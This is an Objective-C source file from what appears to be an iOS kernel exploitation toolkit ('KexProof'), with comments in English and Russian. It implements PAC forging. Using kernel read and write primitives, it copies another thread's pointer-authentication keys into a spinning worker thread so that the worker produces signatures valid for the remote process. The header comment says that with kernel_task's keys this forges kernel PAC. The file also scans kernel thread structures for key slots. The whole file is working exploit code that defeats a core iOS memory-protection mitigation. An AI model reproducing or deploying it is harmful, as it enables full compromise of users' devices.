// pac.m — PAC forging port (lara pac.m) for KexProof.
// remotepac: hijack a local thread, swap its PAC keys for the remote thread's
// keys (via kernel write), run a pacia gadget — yields a signature valid for
// the remote process. With kernel_task's keys this forges kernel PAC.
#import "pac.h"
#import "rc.h"
#import "KPDump.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

extern mach_port_t mach_task_self_;

static uint64_t g_rc_paciagadget = 0;

uint64_t kp_pac_nativestrip(uint64_t address)
{
    return address & 0x7fffffffffULL;
}

uint64_t kp_pacia(uint64_t ptr, uint64_t modifier)
{
    uint64_t val = kp_pac_nativestrip(ptr);
    __asm__ volatile (
        "mov x16, %[ptr]\n"
        "mov x17, %[mod]\n"
        ".long 0xDAC10230\n"   // pacia x16, x17
        "mov %[out], x16\n"
        : [out] "=r"(val)
        : [ptr] "r"(val), [mod] "r"(modifier)
        : "x16", "x17"
    );
    return val;
}

uint64_t kp_ptrauthstrdisc(const char *name)
{
    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
    return 0;
}

bool kp_pacsignworks(void)
{
    void *pcSymbol = dlsym(RTLD_DEFAULT, "getpid");
    if (!pcSymbol) pcSymbol = (void *)&kp_pacsignworks;
    uint64_t pcprobe = kp_pac_nativestrip((uint64_t)pcSymbol);
    uint64_t pcsigned = kp_pacia(pcprobe, kp_ptrauthstrdisc("pc"));
    return pcsigned != pcprobe;
}

// Own spin gadget in __TEXT — guaranteed executable (the old findpacia byte
// scan could land in a non-executable page: KERN_PROTECTION_FAILURE on fetch).
// pacia x16,x17 signs with the thread's CURRENT keys — after the key swap that
// is the remote thread's key set. Then it spins; we sample x16 via get_state.
__attribute__((naked, used)) static void kp_paciagadget(void)
{
    __asm__ volatile(
        ".long 0xDAC10230\n"   // pacia x16, x17
        ".long 0xAA1003E0\n"   // mov x0, x16
        ".long 0x14000000\n"   // b . (spin)
    );
}

uint64_t kp_findpacia(void)
{
    return kp_pac_nativestrip((uint64_t)&kp_paciagadget);
}

// exception port helpers (exc.m port)
mach_port_t kp_createexcport(void);
bool kp_waitexc(mach_port_t excport, kp_excmsg *excbuf, int timeout);
bool kp_statereply(kp_excmsg *exc, kp_arm_thread_state64_internal *state);

// thread helpers (thread.m port)
bool kp_threadsetstate(mach_port_t machthread, uint64_t threadaddr, kp_arm_thread_state64_internal *state);
void kp_threadsetpac(uint64_t threadaddr, uint64_t keya, uint64_t keyb);

static void paclog(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    extern void KPLogDirect(const char *);
    KPLogDirect([s UTF8String]); // зеркало в kexproof-live.log (шеринг-кнопка)
    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
    NSData *d = [[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
    if (!h) { [d writeToFile:p atomically:NO]; return; }
    [h seekToEndOfFile];
    [h writeData:d];
    [h closeFile];
}

static void kp_paccleanup(mach_port_t pacthread, mach_port_t excport, void *stack)
{
    if (pacthread != MACH_PORT_NULL) thread_terminate(pacthread);
    if (excport != MACH_PORT_NULL) mach_port_destruct(mach_task_self_, excport, 0, 0);
    if (stack) free(stack);
}

// Live-pthread remotepac: a real pthread re-signs the pointer in a tight loop
// with its own pacia/pacib. We swap its upcb key slots live; on the next
// context switch the CPU reloads PAC keys from the machine context and the
// loop signs with the REMOTE keys. No thread_set_state, no injected pc, no
// faults, no exception ports — nothing for the kernel to poison or panic on.
static volatile uint64_t g_pac_in_a;
static volatile uint64_t g_pac_in_m;
static volatile uint64_t g_pac_out;
static volatile uint64_t g_pac_out_b;
static volatile uint64_t g_pac_stop;

__attribute__((noinline)) static void *kp_pacworker(void *arg)
{
    (void)arg;
    while (!g_pac_stop) {
        uint64_t a = g_pac_in_a;
        uint64_t m = g_pac_in_m;
        uint64_t v, vb;
        __asm__ volatile(
            "mov x16, %[a]\n"
            "mov x17, %[m]\n"
            ".long 0xDAC10230\n"   // pacia x16, x17
            "mov %[o], x16\n"
            ".long 0xDAC10630\n"   // pacib x16, x17
            "mov %[ob], x16\n"
            : [o] "=r"(v), [ob] "=r"(vb)
            : [a] "r"(a), [m] "r"(m)
            : "x16", "x17", "memory");
        g_pac_out = v;
        g_pac_out_b = vb;
    }
    return NULL;
}

uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modifier)
{
    address = kp_pac_nativestrip(address);

    uint64_t keya = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_ROP_PID);
    uint64_t keyb = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_JOP_PID);
    paclog(@"    [rp] remote keys: a=%#llx b=%#llx", keya, keyb);

    g_pac_in_a = address;
    g_pac_in_m = modifier;
    g_pac_out = 0;
    g_pac_out_b = 0;
    g_pac_stop = 0;

    pthread_t pt;
    int prc = pthread_create(&pt, NULL, kp_pacworker, NULL);
    if (prc) { paclog(@"    [rp] pthread_create rc=%d", prc); return (uint64_t)-1; }
    pthread_detach(pt);

    mach_port_t mp = pthread_mach_thread_np(pt);
    uint64_t kva = [KPDump rcResolveThreadKVA:mp];
    if (!kva) { paclog(@"    [rp] worker thread_t resolve FAIL"); g_pac_stop = 1; return 0; }

    // Независимая валидация worker thread_t: обратная ссылка tro→task должна
    // вести на наш таск (та же, что и у remote-треда). Резолвер для pthread
    // может вернуть чужой объект — запись по нему = паника (доказано).
    uint64_t tro_main = kp_pac_nativestrip(kp_rc_kread64(remotethreadaddr + 0x3E8));
    uint64_t selfTask = kp_pac_nativestrip(kp_rc_kread64(tro_main + 0x28));
    uint64_t tro_w = kp_pac_nativestrip(kp_rc_kread64(kva + 0x3E8));
    uint64_t tsk_w = kp_pac_nativestrip(kp_rc_kread64(tro_w + 0x28));
    int kva_ok = (selfTask & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL && tsk_w == selfTask;
    paclog(@"    [rp] validate: selfTask=%#llx worker→task=%#llx %@", selfTask, tsk_w,
           kva_ok ? @"OK" : @"— НЕ НАШ ТРЕД, стоп (записей не будет)");
    if (!kva_ok) { g_pac_stop = 1; usleep(20000); return 0; }

    // upcb — настоящее хранилище ключей (arm_pac_key_state_t), тип 0x21.
    // ОБА upcb обязаны быть kernel VA — запись по user VA = copy_validate panic.
    uint64_t upcb = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
    uint64_t rupcb = kp_pac_nativestrip(kp_rc_kread64(remotethreadaddr + 0x100));
    int upcb_ok = (upcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
    int rupcb_ok = (rupcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
    int do_swap = upcb_ok && rupcb_ok;
    paclog(@"    [rp] worker upcb=%#llx %@· remote upcb=%#llx %@", upcb,
           upcb_ok ? @"" : @"— НЕ KERNEL VA!", rupcb, rupcb_ok ? @"" : @"— невалиден");

    uint64_t keyb_u = rupcb_ok ? kp_rc_kread64(rupcb + 0xE8) : 0;
    uint64_t ob = upcb_ok ? kp_rc_kread64(upcb + 0xE8) : 0;
    paclog(@"    [rp] remote IB=%#llx · worker orig IB=%#llx · swap %@", keyb_u, ob,
           do_swap ? @"идёт" : @"ПРОПУЩЕН (нет валидных upcb)");

    // baseline: worker signs with its own keys
    for (int i = 0; i < 500 && !g_pac_out; i++) usleep(1000);
    uint64_t baseline = g_pac_out;
    uint64_t baselineB = g_pac_out_b;
    paclog(@"    [rp] baseline: pacia=%#llx pacib=%#llx", baseline, baselineB);

    // live key swap — только подтверждённый слот +0xE8 и только в kernel VA
    if (do_swap)
        kp_rc_kwrite64(upcb + 0xE8, keyb_u);
    uint64_t rb = upcb_ok ? kp_rc_kread64(upcb + 0xE8) : 0;
    paclog(@"    [rp] upcb IB после swap=%#llx", rb);

    uint64_t newsig = baseline, newsigB = baselineB;
    for (int i = 0; i < 300; i++) {
        usleep(1000);
        if (g_pac_out != baseline || g_pac_out_b != baselineB) { newsig = g_pac_out; newsigB = g_pac_out_b; break; }
    }
    newsig = g_pac_out; newsigB = g_pac_out_b;
    paclog(@"    [rp] после swap: pacia=%#llx pacib=%#llx — %@", newsig, newsigB,
           newsigB != baselineB ? @"pacib ИЗМЕНИЛАСЬ — upcb ЖИВОЕ хранилище!" : @"pacib не изменилась за 300мс");

    // restore original IB — только если реально писали
    if (do_swap) {
        kp_rc_kwrite64(upcb + 0xE8, ob);
        uint64_t rb2 = kp_rc_kread64(upcb + 0xE8);
        paclog(@"    [rp] restore: %@", (rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
    }

    g_pac_stop = 1;
    for (int i = 0; i < 100; i++) usleep(1000); // let the worker see the flag and exit
    return newsig;
}

// upcb key-slot discovery READ-ONLY: two same-task threads — key slots hold
// EQUAL high-entropy values (per-task keys); saved-state slots differ.
static void pacnote2(uint32_t off, uint64_t val, int popcount);
void kp_upcbcalib(uint64_t threadVA)
{
    g_pac_in_a = 0x41414141;
    g_pac_in_m = kp_ptrauthstrdisc("pc");
    g_pac_out = 0; g_pac_out_b = 0;
    g_pac_stop = 0;
    pthread_t pt;
    if (pthread_create(&pt, NULL, kp_pacworker, NULL)) { paclog(@"    [cal] pthread_create fail"); return; }
    pthread_detach(pt);
    usleep(2000);
    uint64_t kva = [KPDump rcResolveThreadKVA:pthread_mach_thread_np(pt)];
    if (!kva) { paclog(@"    [cal] resolve fail"); g_pac_stop = 1; return; }

    uint64_t upcbA = kp_pac_nativestrip(kp_rc_kread64(threadVA + 0x100));
    uint64_t upcbB = kp_pac_nativestrip(kp_rc_kread64(kva + 0x100));
    paclog(@"    [cal] upcbA=%#llx upcbB=%#llx", upcbA, upcbB);
    if ((upcbA & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL ||
        (upcbB & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) { g_pac_stop = 1; return; }

    int n = 0;
    for (uint32_t o = 0; o < 0x200; o += 8) {
        uint64_t a = kp_rc_kread64(upcbA + o);
        uint64_t b = kp_rc_kread64(upcbB + o);
        if (a && a == b) {
            // энтропия: считаем популяцию бит
            uint64_t v = a; int pc = 0; while (v) { pc += v & 1; v >>= 1; }
            pacnote2(o, a, pc);
            n++;
        }
    }
    paclog(@"    [cal] совпадающих ненулевых слотов: %d", n);
    g_pac_stop = 1;
    usleep(20000);
}

static void pacnote2(uint32_t off, uint64_t val, int popcount)
{
    paclog(@"    [cal] upcb+%#x = %#llx (popcount=%d)%@", off, val, popcount,
           popcount > 20 ? @" КЛЮЧ-КАНДИДАТ" : @"");
}
